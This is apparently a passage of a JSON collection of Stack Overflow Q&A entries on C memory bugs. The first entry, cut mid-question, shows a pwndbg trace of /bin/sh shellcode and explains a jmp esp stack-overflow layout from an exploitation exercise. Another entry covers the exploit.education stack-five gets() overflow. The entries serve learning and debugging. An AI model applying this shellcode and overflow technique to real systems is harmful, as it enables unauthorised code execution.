0x2f000000\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ DISASM / i386 / set emulate on ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n   0xff8549f3    push   eax\n   0xff8549f4    push   0x68732f\n   0xff8549f9    push   0x6e69622f\n   0xff8549fe    xor    ebx, ebx\n   0xff854a00    add    byte ptr [eax], al\n    \u2193\n \u25ba 0xff854a01    add    byte ptr [eax], al\n   0xff854a03    add    byte ptr [edi], ch\n   0xff854a05    bound  ebp, qword ptr [ecx + 0x6e]\n   0xff854a08    das    \n   0xff854a09    jae    0xff854a73                    <0xff854a73>\n    \u2193\n   0xff854a73    add    byte ptr [eax], al\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ STACK ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n00:0000\u2502 esp eip-1 0xff854a00 \u25c2\u2014 0x0\n01:0004\u2502           0xff854a04 \u25c2\u2014 '/bin/sh'\n02:0008\u2502           0xff854a08 \u25c2\u2014 0x68732f /* '/sh' */\n03:000c\u2502           0xff854a0c \u25c2\u2014 0x0\n04:0010\u2502 edx       0xff854a10 \u2014\u25b8 0x80e5000 (_GLOBAL_OFFSET_TABLE_) \u25c2\u2014 0x0\n... \u2193              2 skipped\n07:001c\u2502           0xff854a1c \u25c2\u2014 0x3e8\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ BACKTRACE ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n \u25ba f 0 0xff854a01\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\npwndbg> \n\nMeaning that the execution is breaking at 0xff854a00.\nNow the solution I found online involved crafting the overflow string in the following way:\n\nWrite 6 NOPs.\nPlace the assembled instruction for jmp esp\nWrite 20 more NOPs.\nPlace the jmp eax gadget to jump to the start of the buffer, overwriting the saved EIP.\nAppend the shellcode.\n\nFrom what I've understood, the jmp ESP instruction allows to direct the execution right after the ret instruction, thus jumping inside the shellcode, but I would like to know more about this.\nI even tried recalling the x86 Call/Return Protocol, but it seems that I cannot fully grasp how jumping to the stack would actually resolve the challenge.\nI seek your help.\nThanks!\n",
        "Answer": "Your code is on the stack under the stack pointer. Part of it is overwritten by your own push instructions. Notice that bound ebp, qword ptr [ecx + 0x6e] has machine code 62 69 6E which corresponds to push 0x6e69622f. Adjusting esp downwards by a suitable amount should fix the problem, e.g. sub esp, 32\nThe other solution works around the problem by putting most of the shellcode above the stack pointer and only using a single jmp esp to transfer control. Here is an illustration of the memory layout:\n|    ...      |           |     ^       |\n|    ...      |           |     |       |\n|    ...      |           |     |       |\n|    ...      | <= ESP => |  shellcode  |\n+-------------+           +-------------+\n|  ret addr   |  jmp eax  |  ret addr   |\n+-------------+           +-------------+\n| pushed data |           | pushed data |\n|     |       |           |     |       |\n|     |       |           |     |       |\n|     v       |           |     v       |\n|  !overlap!  |           |    ...      |\n|     ^       |           |   jmp esp   |\n|     |       |           |    nop      |\n|     |       |           |    nop      |\n|  shellcode  | <= EAX => |    nop      |\n+-------------+           +-------------+\n\nThe initial nops are probably not needed, it should work fine with the jmp esp followed by 26 nops (or whatever padding since it's not going to be executed) instead.\n",
        "Source": "https://stackoverflow.com/questions/77832621/rop-the-use-of-the-jmp-esp"
    },
    {
        "Title": "why is my malloc(1) segfaulting my program?",
        "Question": "I have a problem in my C program that makes it so that it segfaults on malloc(1). I've spent many hours trying to find out why it segfaults but\nI just can't figure it out. This portion of my program separates strings using identifiers. Example, string=\"12wo4ne53wone86wo99w5ne\"; identifiers, start=\"wo\", end=\"ne\"; would return {\"wo4ne\", \"wone\", \"wo99w5ne\"}.\nMy code is as follows.\n// basically like substring() in java\nchar* stringAt(char* str, int start, int end) {\n    int length = end - start + 1;\n    int temp = start;\n    char* savedChar = NULL;\n    savedChar = malloc(length + 1);\n    for(int x = 0; x < length; x++) {\n        savedChar[x] = str[temp];\n        temp++;\n    }\n    savedChar[length] = '\\0';\n    return savedChar;\n}\n\n// finds \"identifier\" in string after certain position in that string\nint findIdentifier(char* str, char* identifier, int pos, int isEnd) {\n\n    // checks first character with first character in \"identifier\"\n    for(int x = pos; x < strlen(str) - 1; x++) {\n        if(str[x] == identifier[0]) {\n\n            // if first characters match then check rest\n            for(int i = 0; i < strlen(identifier); i++) {\n                if(str[x + i] != identifier[i]) {\n                    i = strlen(identifier);\n                }\n                if(i == strlen(identifier) - 1) {\n\n                    // isEnd checks if you should count the last position of the identifier...\n                    // -like ident=\"1234\" then \"end\" is the position of \"4\".\n                    // -not end be the position of \"1\"\n                    if(isEnd == 1) {\n                        return x + strlen(identifier) - 1;\n                    }\n                    return x;\n                }\n            }\n        }\n    }\n    return -1;\n}\n\nchar** separateStrings(char* str, char* identifier, char* lastIdentifier) {\n    char** savedStr = NULL;\n\n    // segfault here!\n    savedStr = malloc(1);\n    // segfualt here!\n\n    int start = -2;\n    int end = 0;\n    int x = 0;\n    do {\n\n    // first run check/gets first and last positions of the identifier in the string\n    if(start == -2) {\n        start = findIdentifier(str, identifier, 0, 0);\n    } else {\n    start = findIdentifier(str, identifier, end + 1, 0);\n    }\n    end = findIdentifier(str, lastIdentifier, start + 1, 1);\n    \n    if(start != -1) {\n        if(end == -1) {\n            end = strlen(str);\n        }\n        char* newStr = stringAt(str, start, end);\n\n        // dynamically increase the size of savedStr (x is iterated every run through here)\n        realloc(savedStr, x + 1);\n        savedStr[x] = malloc(strlen(newStr) + 1);\n        strcpy(savedStr[x], newStr);\n        x++;\n    }\n\n    } while(start != -1 && end != -1);\n    return savedStr;\n}\n\nI have tried looking up why this could not be working and the only thing I can think of is a Buffer Overflow. So I then tried to run findIdentifier() many times but that works fine.\nThe program is also inconsistent and sometimes runs farther into the code than others but is accurate with its outcomes.\n",
        "Answer": "If savedStr is supposed to be a dynamically allocated array of strings, then allocating 1 byte of memory is not sufficient to store a pointer to a char (depending on your platform, this requires either 4 or 8 bytes).\nEven when you realloc it to be larger, you're only adding 1 byte at a time. This when you reference and assign with savedStr[x] = malloc(strlen(newStr) + 1); you're invoking undefined behavior, which in this case it would seem has manifested as a segmentation fault.\nYou almost certainly want to allocate:\nsavedStr = malloc(sizeof(char *));\n\nAnd then when you re-allocate:\nrealloc(savedStr, (x + 1) * sizeof(char *));\n\nBut you also want to capture the pointer realloc returns. If you're not too worried about allocation error checking:\nsavedStr = realloc(savedStr, (x + 1) * sizeof(char *));\n\nBreaking out the dynamically resized string vector problem\nOne of the core problems your code solves is having an array that grows dynamically. If you break this bit of code out, then you can approach the remainder of your program without worrying about the memory management.\nThe size of the array doubles when needed rather than growing by a single entry to minimize allocations. There may be more ideal growth factors for efficiency.\n#include <string.h>\n#include <stdlib.h>\n#include <stdio.h>\n\nstruct string_vec {\n    char **data;\n    size_t cap;\n    size_t sz;\n};\n\nstruct string_vec *string_vec_new(size_t cap) {\n    struct string_vec *vec = malloc(sizeof(struct string_vec));\n    if (!vec) return NULL;\n\n    *vec = (struct string_vec){\n        .data = malloc(sizeof(char *) * cap),\n        .cap = cap,\n        .sz = 0\n    };\n\n    return vec;\n}\n\nstruct string_vec *string_vec_add(\n    struct string_vec *vec,\n    const char *str\n) {\n    if (vec->sz < vec->cap) {\n        vec->data[vec->sz++] = strdup(str);\n        return vec;\n    }\n\n    char **new_data = realloc(vec->data, sizeof(char *) * vec->cap * 2);\n    if (!new_data) return NULL;\n\n    vec->data = new_data;\n    vec->cap *= 2;\n    vec->data[vec->sz++] = strdup(str);\n\n    return vec;\n}\n\nvoid string_vec_del(struct string_vec *vec) {\n    for (size_t i = 0; i < vec->sz; i++) {\n        free(vec->data[i]);\n    }\n\n    free(vec->data);\n}\n\n",
        "Source": "https://stackoverflow.com/questions/77724594/why-is-my-malloc1-segfaulting-my-program"
    },
    {
        "Title": "How to properly memcpy without overflow issues",
        "Question": "In a legacy code I am getting buffer overflow errors in fortify audit.\nLet me explain the issue here:\nI have a function, say foo(size_t len, unsigned char **buf)  ,in this foo I am memcopying a string variable in buf as follows.\nchar temp[256];\n\nsprintf(temp, \"abcd%s\",somefunct_string.c_str()); //so the string temp is variable length\n\nmemcpy(*buf, temp, temp.length()); \n\nin practical, the temp.length() is always < len (which is buf alloted size). But fortify would give potential risk here.\nhow do i resolve this?\n",
        "Answer": "Try calling the std::string::data() function to access the string via a pointer to the string.\nmemcpy(*buf, somefunct_string.data(), somefunct_string.size());\n\nAlso, memcpy_s() is available since C11.\nmemcpy_s(*buf, temp.length(), somefunct_string.data(), somefunct_string.size())\n\nmemcpy() and memcpy_s() are called when copying a sequence from one array to another array.  If the copy overlaps within the same array, memmove() or memmove_s() should be called.\n",
        "Source": "https://stackoverflow.com/questions/77593393/how-to-properly-memcpy-without-overflow-issues"
    },
    {
        "Title": "Why getting &quot;segmentation fault&quot; when sending 127 characters to a buffer with capacity of 128",
        "Question": "I have the following code taken from a binary exploitation exercises:\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n\n#define BANNER \\\n  \"Welcome to \" LEVELNAME \", brought to you by https://exploit.education\"\n\nchar *gets(char *);\n\nvoid start_level() {\n  char buffer[128];\n  gets(buffer);\n}\n\nint main(int argc, char **argv) {\n  printf(\"%s\\n\", BANNER);\n  start_level();\n}\n\nMy question is regarding the way the buffer stores the information.\nOur buffer has storage for 128 characters.\nWhen I send 127 characters I am getting segmentation fault:\nuser@phoenix-amd64:/opt/phoenix/amd64$ python -c 'print(\"A\"*127)'  | ./stack-five \nWelcome to phoenix/stack-five, brought to you by https://exploit.education\nSegmentation fault\n\n\nBut if I send 126 characters, there is not error:\nuser@phoenix-amd64:/opt/phoenix/amd64$ python -c 'print(\"A\"*126)'  | ./stack-five \nWelcome to phoenix/stack-five, brought to you by https://exploit.education\nuser@phoenix-amd64:\n\nIf the buffer has capacity of 128, and I sent it 127 characters, why it failed? It should have at least one more place no?\nOne thing I though is maybe after sending 127 characters, it adds the NULL terminator (\\x00) but even if that happens, we have exactly 128 characters, so why it crash?\n",
        "Answer": "You have a buffer overflow between the '\\n' that Python print() adds and the '\\0' you need for the string that c adds:\n[python3 -c 'print(\"A\"*126)' | wc -c\n127\n\nI would fix that in Python with:\npython3 -c \"print('A'*126, end='')\" | wc -c\n126\n\ngets() is unsafe so use fgets() instead.\n",
        "Source": "https://stackoverflow.com/questions/77504824/why-getting-segmentation-fault-when-sending-127-characters-to-a-buffer-with-ca"
    },
    {
        "Title": "C problem about Compiler and Memory Theory",
        "Question": "Without calling any \"call\" or \"jump\" function, we need to get a output in order of \"this is the first\" then \"this is the second.\". In my opinion we need to use \"bold\" with the use of Memory and instructions. Also we cannot call the function of \"study\".\n#include <stdio.h>\n\nvoid study()\n{\n    printf(\"this is the second.\\n\");\n}\n\nvoid study2()\n{\n    int bold[4];\n    // can only modify this section BEGIN\n    // cant call study(), maybe use study(pointer to function)\n\n\n    // can only modify this section END\n    printf(\"this is the first\\n\");\n}\n\nint main(int argc, char *argv[])\n{\n    study2();\n    return 0;\n}\n\n",
        "Answer": "Perhaps not what OP had in mind, yet macros do the trick.\n#include <stdio.h>\n\nvoid study() {\n  printf(\"this is the second.\\n\");\n}\n\nvoid study2() {\n  int bold[4];\n  // can only modify this section BEGIN\n  // Without calling any \"call\" or \"jump\" function, \n  #define F1 study\n  #define F2 study2\n  #define study2() F2(); F1();\n  // can only modify this section END\n  printf(\"this is the first\\n\");\n}\n\nint main(int argc, char *argv[]) {\n  study2();\n  return 0;\n}\n\nOutput\nthis is the first\nthis is the second.\n\n\nMaybe violates <Also we cannot call the function of \"study\".>.  Depends on \"we\", if \"we\" is the portion of code between BEGIN ... END, it is OK.\nElse if \"we\" is anywhere in code, than maybe a direct approach:\nvoid study2() {\n  int bold[4];\n  // can only modify this section BEGIN\n  #define printf(x) printf(\"this is the first\\nthis is the second.\\n\")\n  // can only modify this section END\n  printf(\"this is the first\\n\");\n}\n\n\n@Peter Cordes suggests a 3rd way, where our modification does not call study().\nvoid study2() {\n  int bold[4];\n  // can only modify this section BEGIN\n  atexit(study);\n  // can only modify this section END\n  printf(\"this is the first\\n\");\n}\n\n",
        "Source": "https://stackoverflow.com/questions/77399108/c-problem-about-compiler-and-memory-theory"
    },
    {
        "Title": "&#39;malloc(): corrupted top size&#39; After allocating more than 200K int",
        "Question": "I got assignment to do Bucket Sort with openMP, and I decided to do Quick Sort on each bucket. The requirement wants me to test by keep increasing the amount of integers and change the number of thread until reaching 1 million integers with 16 threads.\nHere's my code in C:\n#include <stdio.h>\n#include <omp.h>\n#include <time.h>\n#include <stdlib.h>\n#include <math.h>\n\nvoid swap(int* a, int* b) {\n    int temp = *a;\n    *a = *b;\n    *b = temp;\n\n}\n\nint partition(int arr[], int low, int high) {\n\n    int pivot = arr[high];\n    int i = low - 1;\n\n    for (int j = low; j < high; j++) {\n\n        if (arr[j] <= pivot) {\n            i++;\n            swap(&arr[i], &arr[j]);\n        }\n\n    }\n\n    swap(&arr[i + 1], &arr[high]);\n\n    return (i + 1);\n}\n\nvoid quickSort(int arr[], int low, int high) {\n\n    if (low < high) {\n        int pi = partition(arr, low, high);\n\n        quickSort(arr, low, pi - 1);\n        quickSort(arr, pi + 1, high);\n    }\n\n}\n\nint main(int argc, char* argv[]) {\n\n    //Check arguments\n    if (argc > 3 || argc < 3) {\n        fprintf(stderr, \"Error: Invalid arguments. This program require 2 arguments.\\nUsage: ./bucketSort <thread number> <amount of random number>\\n\");\n        return 1;\n    }\n\n    printf(\"Random seed\");\n\n    //Initialize random seed\n    srand((unsigned)time(NULL));\n\n    int threadNum = atoi(argv[1]);\n    int randomTime = atoi(argv[2]);\n\n    int* numArr = (int*)malloc(randomTime * sizeof(int));\n\n    if(numArr == NULL){\n        fprintf(stderr, \"Error: Unable to allocate memory.\");\n        return 1;\n    }\n\n    printf(\"\\nStart random\");\n\n    //Since RAND_MAX is limited to 0x7FFF (32,767), so we need to get creative to random beyond RAND_MAX\n    for (int i = 0; i < randomTime; i++) {\n\n        int rand1 = rand();\n        int rand2 = rand();\n        int rand3 = rand();\n\n        int combinedRandom = ((rand1 % 100) * 1000) + ((rand2 % 100) * 10) + (rand3 % 10);\n\n        numArr[i] = combinedRandom;\n\n    }\n\n    printf(\"\\nFinished Random\");\n\n    double timeSpent = 0;\n\n    int rangePerBucket = ceil(99999 / threadNum);\n\n    int* outputArr = (int*)malloc(randomTime * sizeof(int));\n\n    int* groupMemberCount = (int*)malloc(threadNum * sizeof(int));\n\n    if(outputArr == NULL || groupMemberCount == NULL){\n        fprintf(stderr, \"Error: Unable to allocate memory.\");\n        return 1;\n    }\n\n    clock_t begin = clock();\n\n    printf(\"\\nStart parallel section.\");\n\n    #pragma omp parallel shared(numArr, outputArr, groupMemberCount) num_threads(threadNum)\n    {\n\n        int myID = omp_get_thread_num();\n        int totalThread = omp_get_num_threads();\n\n        int beginRange = myID * rangePerBucket;\n        int endRange = (myID + 1) * rangePerBucket - 1;\n\n        int* temp = (int*)omp_alloc(rangePerBucket * sizeof(int), omp_large_cap_mem_alloc);\n\n        if( temp == NULL ){\n            fprintf(stderr, \"Error: Thread %d is unable to allocate memory.\", myID);\n\n        }\n\n        int memberCount = 0;\n\n        //Put in bucket\n        for (int j = 0; j < randomTime; j++)\n        {\n            if (numArr[j] >= beginRange && numArr[j] <= endRange) {\n                temp[memberCount] = numArr[j];\n                memberCount++;\n            }\n        }\n\n        groupMemberCount[myID] = memberCount;\n\n        int* myGroup = (int*)omp_alloc(memberCount * sizeof(int), omp_large_cap_mem_alloc);\n\n        if( myGroup == NULL ){\n            fprintf(stderr, \"Error: Thread %d is unable to allocate memory.\", myID);\n        }\n\n        for (int i = 0; i < memberCount; i++) {\n            myGroup[i] = temp[i];\n        }\n\n        //Sort\n        quickSort(myGroup, 0, memberCount - 1);\n        printf(\"\\nThread %d of %d has finished sorting.\", myID, totalThread);\n\n        //Find the start of output array\n        int startIndex = 0;\n        for( int i = 0; i < myID; i++ ){\n            startIndex += groupMemberCount[i];\n        }\n\n        //Combine array\n        for (int k = 0; k < memberCount; k++) {\n\n            outputArr[startIndex + k] = myGroup[k];\n\n        }\n\n        printf(\"\\nArray from thread %d has combined.\", myID);\n\n        omp_free(myGroup, omp_large_cap_mem_alloc);\n        omp_free(temp, omp_large_cap_mem_alloc);\n    }\n\n    free(numArr);\n    free(outputArr);\n    free(groupMemberCount);\n\n    clock_t end = clock();\n\n    timeSpent = (double)(end - begin) / CLOCKS_PER_SEC;\n\n    printf(\"\\nTime spent sorting: %f seconds.\\n\", timeSpent);\n\n    return 0;\n}\n\nI compiled it with gcc -fopenmp ./bucketSort.c -o ./bucketSort. Everything runs fine until I start testing with 100K integers (I wrote 200K in the topic because my program allocate it twice). The program immediately return malloc(): corrupted top size after printing Finished Random (so the first 100K in numArr is fine?). This is the first time I used malloc() and omp_alloc(), so feel free to correct me if I've done something wrong. I'm running this code in Ubuntu WSL btw.\nWhat I've tried:\n\nI tried calloc() but the result is the same, error after 2nd calloc().\nI tried increase ulimit to unlimit.\n\n",
        "Answer": "Usually, valgrind or -fsanitize=address give good diagnostics for such errors.\nCompiling and linking with -fsanitize=address shows that there is a heap overflow on this line:\n                temp[memberCount] = numArr[j];\n\nThe memberCount variable is equal to rangePerBucket at this point.  Both are one less than randomTime.  But the temp array has only rangePerBucket elements, so that index is out of range.\n",
        "Source": "https://stackoverflow.com/questions/77303320/malloc-corrupted-top-size-after-allocating-more-than-200k-int"
    },
    {
        "Title": "How to represent ASCII code 16 as a character?",
        "Question": "[C language] [Linux]\n\"ASCII code 16 is represented by the control character \u2410 also known as the data link escape\"\nI want to take this character from the keyboard as an input to a program that allows you to do a buffer overflow. It works only if i overwrite an INT variable with this value: 1161258512.\nI don't know how to build this number because it s not possible to write the single character 16 as an input. I also tried with the escape sequence but it didn't work. Maybe i should use unicode to do that and write the first 2 characters (with the 16 included) of the 4 byte payload.\nI'm new to this kind of things so please if you know more i would really appreciate it\n",
        "Answer": "\nit s not possible to write the single character 16 as an input\n\nThis is a strange expression. DLE is 0x10, 16, as you know.\nHow to get this from the keyboard depends much of many things you did not disclose: what OS?\nThe control key on input\nThe effect of pressing control as you type a key is to mask bits 5 and 6, those with values 32 and 64, so this is your answer:\nyou can use Ctrl+P, Ctrl+p or Ctrl+0 since there 3 possible values:\n\n0 is 0x30\nP is 0x50\nP is 0x70\n\nBut to read this you need to prepare your keyboard driver.  Under Linux and family pos-Unix use raw input and under Windows call ReadConsoleInput or similar.\nIn short you save the input configuration, prepare it to some that suits your needs, such disabling echo and buffering, then read the key codes. And at the end you restore everything.\nMicrosoft have a Console Reference. Under Linux man is your friend. Look for raw io and ioctl\n",
        "Source": "https://stackoverflow.com/questions/77077702/how-to-represent-ascii-code-16-as-a-character"
    },
    {
        "Title": "Changing values in hex-editor properly",
        "Question": "I want to change a file (.ULNC) and successfully did so in the past when the decoded texts i change have the same length or when the value I want to replace is bigger then the one i want to replace it with by filling the blanks with 00\nNow I have the issue, that the opposite is the case and my \"new\" encoded text is a bigger length than the original one.\nTo be more clear:\nI want to replace 53 61 6D 48 51 5F 41 with 53 61 6D 44 69 76 69 6E 67 5F 41\nwhat I want to change\nAny help or hint would be greatly appreciated!\nI tried just copying the value in like you see in the screenshot.\nmy attempt\nHxD Hex Editor warns me, it will change the filesize. When I confirm, start the program and load the changed file, it causes a bufferoverflow and crashes.\nI also tried... deleting some 00 00 00 00 in a place I thought they were not needed, the program then also crashed, this time without bufferoverflow warning.\n",
        "Answer": "I did it by shortening 53 61 6D 44 69 76 69 6E 67 5F 41 in the file it got originally referenced to 53 61 6D 44 69 76 69 and so kept the same byte size as  53 61 6D 48 51 5F 41.\nWorks now.\n",
        "Source": "https://stackoverflow.com/questions/76983981/changing-values-in-hex-editor-properly"
    },
    {
        "Title": "Overflow when reading a file",
        "Question": "When reading a simple file, I keep overflowing and reading bytes out of the file despite making sure I get the size of the file in bytes prior to the read.\nHere is my current code:\nFILE* file;\nint error_no = fopen_s(&file, filepath, \"r\");\n\nif (error_no != 0 || file == 0) {\n    std::cout << \"Error whilst reading file: \" + error_no;\n}\n\nfseek(file, 0, SEEK_END);\nsize_t size = ftell(file);\n\nchar* fileAsString = (char*) malloc(size+1);\n\nfseek(file, 0, SEEK_SET);\nfread(fileAsString, 1, size, file);\n\nfileAsString[size] = 0;\n\nstd::cout << \"\\n\" << size << \"\\n\";\nstd::cout << fileAsString;\n\nfclose(file);\n\nI am expecting to open the file, push the stream to the end of the file and use ftell to find the number of characters in the file.\nThen I make a string buffer to copy the file's content into.\nThen finally I reset the file stream and read it into my string buffer. I complete this by adding the end-of-string character at the end of the buffer.\nSadly this is what I get:\n114\n#version 330 core\n\nlayout(location = 0) out vec4 color;\n\nvoid main()\n{\n        color = vec4(1.0, 0.0, 0.0, 1.0);\n}\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n\nI checked and the file contains 107 characters, which explains the 114 length and 7 '=' characters that shouldn't be there.\nThe actual file contents are:\n#version 330 core\n\nlayout(location = 0) out vec4 color;\n\nvoid main()\n{\n    color = vec4(1.0, 0.0, 0.0, 1.0);\n}\n\nHope this is clear enough!\n",
        "Answer": "When you read a file with \"r\" mode, you are reading in text mode and your two-byte \\r\\n line endings are being converted to \\n strings in memory.  But ftell is returning the length of the file in bytes (with each newline counting for two bytes).  But you are marking the end of the string (by setting a null character) according to how  many bytes were in the file, as opposed to how many characters are in the string.  Since you have placed your null terminator past the end of the string, you have one character of junk for each newline in your original file.\nInstead, you probably want to preserve the bytes of the original file. To do this, try opening the file in \"rb\" mode to read it in binary mode which should prevent it from changing \\r\\n in the file to \\n in the string in memory.\n",
        "Source": "https://stackoverflow.com/questions/76958048/overflow-when-reading-a-file"
    },
    {
        "Title": "Index overflow in for loop with nested thread",
        "Question": "I am writing a testing utility (a WinForm) to check how a web site perform. To do so i set a number of request to make, with a list of parameters associated with requests. I can set the requests to happen in parallel or in sequence.\nIf i work in sequence everything is fine, but if i work in parallel i get a strange issue with the for loop.\nI know i may use Parallel.For but because i am investigating another bug related to parallelism i temporary used a regualr for, with a nested action executed directly or with a Task.Run().\nHere the problematic code :\nprivate void Run()\n{\n    ConcurrentBag<long> callTimes = new ConcurrentBag<long>();\n    int httpErrors = 0;\n    int progress = 0;\n\n    string uri = txtUrl.Text ?? string.Empty;\n    if (string.IsNullOrWhiteSpace(uri))\n        return;\n\n    Func<List<string>,int,long> testCall = (p,i) =>\n    {\n        try\n        {\n            using (var client = new HttpClient())\n            {\n                Stopwatch timer = new Stopwatch();\n                timer.Start();\n\n                string actualUrl = string.Format(uri, p.ToArray());\n                var getTask = client.GetAsync(actualUrl);\n                getTask.Wait();\n\n                timer.Stop();\n\n                var result = getTask.Result;\n                if (result == null || (int)result.StatusCode >= 400)\n                {\n                    txtErrors.ThreadSafeAppendText($\"Connection error {(result?.StatusCode.ToString() ?? \"NULL\")}'\\r\\n\");\n                    Interlocked.Increment(ref httpErrors);\n                }\n\n                return timer.ElapsedMilliseconds;\n            }\n        }\n        catch ( Exception actionErr)\n        {\n            txtErrors.ThreadSafeAppendText($\"Error while execution callAction {i} with parameters '{string.Join(\", \" , p)}' : \\r\\n\" + actionErr.Message);\n        }\n\n        return -1;\n    };\n\n    try\n    {\n        List<List<string>> parameters = this.ParseParameters();\n        int parametersCount = parameters.Count;\n        int executions = (int)updRequests.Value;\n\n        //used to randomly access parameters in a way suitable also for the parallel scenario (i precompute all the random number i need while parallel processing is not yet started)\n        Random rng = new Random();\n        List<int> randoms = new List<int>();\n        for (int i = 0; i < executions; i++)\n            randoms.Add(rng.Next(0, parametersCount));\n\n        //randoms.Count is guaranteed to be equal to executions \n\n\n        for ( int index = 0; index < executions; index++)\n        {\n            Action parallelAction = () =>\n            {\n                int currentIndex = index;\n                List<string> currentParameter = parameters[randoms[currentIndex] % parametersCount]; //<<--- strange overflow here currentIndex >= executions\n                callTimes.Add(testCall(currentParameter, currentIndex));\n\n                Interlocked.Increment(ref progress);\n\n                if (progress % 10 == 0)\n                    prbProgress.ThreadSafeAction(this.RefreshProgressBar, progress, executions);\n            };\n\n            if (chkParallelExecution.Checked)\n                